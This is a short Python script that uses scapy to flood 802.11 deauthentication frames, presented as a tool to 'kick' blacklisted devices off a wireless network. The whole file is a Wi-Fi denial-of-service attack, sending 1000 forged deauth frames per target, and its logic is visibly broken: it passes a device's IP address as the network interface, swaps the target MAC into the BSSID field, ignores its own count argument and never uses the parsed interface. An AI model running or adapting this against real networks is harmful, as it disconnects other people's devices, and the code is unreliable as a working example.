from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import argparse
import sys

def read_devices_from_file(filename):
    devices = []
    try:
        with open(filename, "r") as file:
            lines = file.readlines()
            for line in lines:
                ip, mac = line.strip().split()
                devices.append({"ip": ip, "mac": mac})
    except FileNotFoundError:
        print(f"File '{filename}' not found.")
    return devices

def kick_blacklisted_device(device):
    # Your code here to kick the blacklisted device
    print(f"Kicking blacklisted device with IP: {device['ip']} - MAC: {device['mac']}")
    deauth(device["ip"], 1, device["mac"], "ff:ff:ff:ff:ff:ff")

def deauth(iface, count, bssid, target_mac):
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap() / dot11 / Dot11Deauth()
    sendp(frame, iface=iface, count=1000, inter=0.100, verbose=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Kick blacklisted devices.")
    parser.add_argument("-i", "--interface", required=True, help="interface to send deauth packets from")
    parser.add_argument("--blacklist-file", default="blacklist.txt", help="Path to the file containing blacklisted devices")
    args = parser.parse_args()

    blacklist_devices = read_devices_from_file(args.blacklist_file)
    blacklist_macs = set(device["mac"] for device in blacklist_devices)

    devices = read_devices_from_file("devices.txt")

    for device in devices:
        mac_address = device["mac"]
        if mac_address in blacklist_macs:
            kick_blacklisted_device(device)
